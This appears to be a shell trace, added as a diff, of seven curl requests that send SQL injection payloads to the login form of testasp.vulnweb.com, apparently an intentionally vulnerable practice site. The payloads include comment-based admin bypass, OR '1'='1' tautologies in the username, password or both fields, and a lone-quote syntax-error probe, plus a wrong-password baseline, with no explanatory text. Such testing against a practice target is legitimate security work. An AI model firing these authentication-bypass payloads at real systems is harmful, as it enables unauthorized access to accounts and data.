@@ -1,0 +1,7 @@
++ curl -sS -i --max-time 20 -c cj_s1.txt -D hdr_s1_admin_comment.txt -o body_s1_admin_comment.html -X POST --data-urlencode 'tfUName=admin'\''-- ' --data-urlencode tfUPass=x http://testasp.vulnweb.com/Login.asp
++ curl -sS -i --max-time 20 -c cj_s2.txt -D hdr_s2_tautology.txt -o body_s2_tautology.html -X POST --data-urlencode 'tfUName='\'' OR '\''1'\''='\''1'\''-- ' --data-urlencode tfUPass=x http://testasp.vulnweb.com/Login.asp
++ curl -sS -i --max-time 20 -c cj_s3.txt -D hdr_s3_or1eq1.txt -o body_s3_or1eq1.html -X POST --data-urlencode 'tfUName=zz'\'' OR 1=1-- ' --data-urlencode tfUPass=x http://testasp.vulnweb.com/Login.asp
++ curl -sS -i --max-time 20 -c cj_s4.txt -D hdr_s4_bothfields.txt -o body_s4_bothfields.html -X POST --data-urlencode 'tfUName='\'' OR '\''1'\''='\''1' --data-urlencode 'tfUPass='\'' OR '\''1'\''='\''1' http://testasp.vulnweb.com/Login.asp
++ curl -sS -i --max-time 20 -c cj_s5.txt -D hdr_s5_passonly_inj.txt -o body_s5_passonly_inj.html -X POST --data-urlencode tfUName=admin --data-urlencode 'tfUPass=x'\'' OR '\''1'\''='\''1'\''-- ' http://testasp.vulnweb.com/Login.asp
++ curl -sS -i --max-time 20 -c cj_s6.txt -D hdr_s6_quote_syntaxerr.txt -o body_s6_quote_syntaxerr.html -X POST --data-urlencode 'tfUName=admin'\''' --data-urlencode tfUPass=x http://testasp.vulnweb.com/Login.asp
++ curl -sS -i --max-time 20 -c cj_s7.txt -D hdr_s7_admin_wrongpass.txt -o body_s7_admin_wrongpass.html -X POST --data-urlencode tfUName=admin --data-urlencode tfUPass=definitely_wrong_pw http://testasp.vulnweb.com/Login.asp
